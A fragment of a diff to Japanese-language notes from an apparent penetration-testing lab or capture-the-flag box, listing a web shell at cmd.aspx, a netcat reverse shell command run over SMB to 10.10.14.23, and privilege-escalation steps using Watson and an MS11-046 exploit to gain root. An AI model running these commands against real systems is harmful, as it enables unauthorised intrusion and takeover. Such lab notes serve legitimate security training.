@@ -24,3 +24,8 @@
   - `http://$IP/cmd.aspx` にアクセス
   - `\\10.10.14.23\share\nc.exe -e cmd.exe 10.10.14.23 12345`
 
+# Privesc
+- Watson を使ってパッチ未適用に起因する脆弱性を探す
+- SMB上に `Watson.exe` をおいてターゲット上で実行
+- MS11-046
+- https://github.com/abatchy17/WindowsExploits からコードをとってきて攻撃、rootをとる
